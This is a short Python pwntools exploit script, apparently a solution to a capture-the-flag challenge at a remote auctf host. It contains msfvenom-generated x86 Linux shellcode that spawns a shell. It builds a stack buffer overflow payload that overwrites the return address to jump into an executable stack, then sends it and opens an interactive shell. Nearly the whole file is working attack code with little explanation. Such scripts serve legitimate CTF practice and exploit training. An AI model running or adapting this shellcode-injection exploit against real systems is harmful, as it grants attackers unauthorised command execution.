from pwn import *

# exec 'sh' shellcde generated with msfvenom
# msfvenom -a x86 --platform linux -p linux/x86/exec CMD="sh" -b "\x00\x0A" -n 32 -f python
shel =  b""
shel += b"\x2f\x43\x4b\x43\x48\xfc\x2f\x42\x9b\x91\x4a\x40\xd6"
shel += b"\x9f\x27\xf9\x3f\x43\x2f\xfc\x90\x9f\x93\x93\x90\xd6"
shel += b"\x2f\x91\x27\xf5\xfd\xfc\x29\xc9\x83\xe9\xf6\xe8\xff"
shel += b"\xff\xff\xff\xc0\x5e\x81\x76\x0e\xfa\xac\xc3\x8b\x83"
shel += b"\xee\xfc\xe2\xf4\x90\xa7\x9b\x12\xa8\xca\xab\xa6\x99"
shel += b"\x25\x24\xe3\xd5\xdf\xab\x8b\x92\x83\xa1\xe2\x94\x25"
shel += b"\x20\xd9\x12\xaf\xc3\x8b\xfa\xdf\xab\x8b\xad\xff\x4a"
shel += b"\x6a\x37\x2c\xc3\x8b"

shelen = len(shel)

buflen = 0x808

exploit = shel + (b"\xCC" * (buflen - shelen - 8))

# Local with ASLR disabled in /proc/sys/kernel/randomize_va_space == 0
#ebp = 0xffff9078
ebp = 0xffff9bb8

shel_base = ebp + 0x18
ret_addr = ebp + 0x04

# last 2 DWORDs are arbitrary write primitives
# since stack is RWX, ret to shellcode
exploit = exploit + p32(shel_base) + p32(ret_addr)

name = "w01verines"

#p = process('./online')
p = remote('challenges.auctf.com', 30013)
p.recv()
p.sendline(name)
p.recv()

# get into hacker class to launch exploit
p.sendline("attend Hacker")
p.sendline(exploit)
p.interactive()
